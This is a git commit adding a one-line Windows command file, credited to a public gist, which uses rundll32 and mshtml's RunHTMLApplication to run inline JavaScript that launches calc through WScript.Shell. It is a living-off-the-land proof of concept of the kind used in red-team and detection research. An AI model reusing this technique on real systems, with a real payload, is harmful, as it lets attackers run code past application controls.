abbbda6c4a2406dc9b913bc967f6df17d766b18f
InvokeThreatGuy <invokethreatguy@gmail.com>
2016-10-29 10:01:06 -0400

    Create sample.cmd

---
+++ sample.cmd
@@ -0,0 +1,4 @@
+* This is taken from Casey Smith @subTee
+* https://gist.github.com/subTee/62fc28bb5dc58dbe9efdd56d65921bd2
+
+rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.Exec(\"calc\")");
